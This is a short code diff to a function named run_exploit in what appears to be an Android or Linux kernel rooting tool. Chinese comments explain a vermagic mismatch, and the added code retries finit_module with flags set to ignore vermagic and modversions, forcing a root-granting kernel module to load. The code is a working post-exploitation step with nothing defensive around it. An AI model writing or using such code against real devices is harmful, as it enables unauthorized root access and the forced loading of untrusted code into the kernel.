@@ -673,8 +673,24 @@ int run_exploit(int argc, char **argv) {
             if (ko && !ksu_done && (poll_i % 5) == 0) {
               int kfd = open(ko, O_RDONLY);
               if (kfd >= 0) {
+                /* mt50: vermagic 不匹配 (ko=5.10.252-dirty vs 本机 5.10.209) →
+                 * 内核自带正规绕道: finit_module flags. 已指令级实证
+                 * check_modinfo+0x2cc (0xffffffc0082a4ea4) tbnz w22,#1 =
+                 * bit1(IGNORE_VERMAGIC=2) 置位直接跳过 vermagic 比较; bit0
+                 * (IGNORE_MODVERSIONS=1) 使 __versions 索引归零 (跳 CRC 校验,
+                 * TAINT_FORCED_MODULE, 无害). 梯子: 先 0 (留诊断: 哪个检查挡的)
+                 * → 失败再 3. 见 VERMAGIC_BYPASS_2026-08-16.md */
                 long rc = syscall(SYS_finit_module, kfd, "", 0);
                 int insmod_errno = errno;
+                if (rc != 0 && (insmod_errno == ENOEXEC || insmod_errno == EINVAL)) {
+                  long rc2 = syscall(SYS_finit_module, kfd, "", 3);
+                  int e2 = errno;
+                  pr_info("mt50: flags=3 retry rc=%ld errno=%d (first errno=%d)\n",
+                          rc2, e2, insmod_errno);
+                  fflush(stdout);
+                  if (rc2 == 0) { rc = 0; insmod_errno = 0; }
+                  else { insmod_errno = e2; }
+                }
                 close(kfd);
                 if (rc == 0) {
                   ksu_done = 1;
